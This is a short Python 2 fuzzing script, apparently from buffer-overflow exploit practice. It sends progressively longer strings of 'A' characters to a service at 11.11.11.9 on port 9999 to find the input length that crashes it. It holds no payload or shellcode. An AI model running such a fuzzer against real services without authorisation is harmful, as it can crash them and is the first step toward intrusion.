#!/usr/bin/python
import socket
# create an array of buffers, while increasing them.
buffer=["A"]
counter = 100
while len(buffer) <= 30: 
     buffer.append("A"*counter)
     counter = counter + 200
for string in buffer: 
     print "Fuzzing PASS with %s bytes" % len(string)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect = s.connect(('11.11.11.9',9999))
     s.recv(1024) 
     s.send(string + '\r\n')
     s.close()

